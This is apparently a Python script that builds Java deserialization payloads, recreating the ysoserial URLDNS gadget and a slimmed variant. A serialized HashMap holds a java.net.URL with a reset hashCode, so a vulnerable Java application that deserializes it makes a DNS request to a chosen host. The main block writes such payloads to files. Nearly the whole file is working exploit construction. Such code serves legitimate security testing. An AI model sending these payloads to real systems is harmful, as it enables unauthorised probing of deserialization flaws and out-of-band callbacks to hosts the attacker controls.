import deserek 
from javaObj import * 
from javaCommons import *


class j_HashMap__slim(JavaSerializableClass):
  _class_name = "java.util.HashMap"
  _uid = 362498820763181265
  
  MAP = None
  
  def _init_fields(self):
    return  [
    ]
  
  def constructor(self):
    self.MAP = {}

  def writeObject(self, wr: JavaObjectWriter):
    self.defaultWriteObject()
    size = len(self.MAP)
    with wr.binary_block() as binwr:
      binwr.writeInt(0x00) # buckets
      binwr.writeInt(size)  # size
    for k,v in self.MAP.items():
      wr.write(k.to_deserek())
      wr.write(v.to_deserek())
      

class j_java_net_URL__slim(JavaSerializableClass):
  _class_name = "java.net.URL"
  _uid = -7627629688361524110
  
  def _init_fields(self):
    return  [
      JavaStringField("authority"),
      JavaStringField("protocol"),
    ]





def YsoSerial_URL(host):
  h = j_HashMap()
  i1 = j_simpleInteger()
  i1.value = 42

  u1 = j_java_net_URL()
  u1.hashCode = -1
  u1.port = 80
  u1.protocol = "https"
  u1.authority = host
  u1.file = "a"
  h.MAP[u1] = i1

  return deserek.do_serialize(h.to_deserek())


def YsoSerial_URL__slim(host):
  h = j_HashMap__slim()
  s1 = j_String("W")
  u1 = j_java_net_URL__slim()
  #u1.hashCode = -1
  u1.authority = host
  u1.protocol = 'ftp'
  h.MAP[u1] = s1
  return deserek.do_serialize(h.to_deserek())



if __name__ == '__main__':
  open('tmp_yso1.bin',"wb").write( YsoSerial_URL("test12.com"))
  open('tmp_yso2.bin',"wb").write( YsoSerial_URL__slim("test123.com"))

   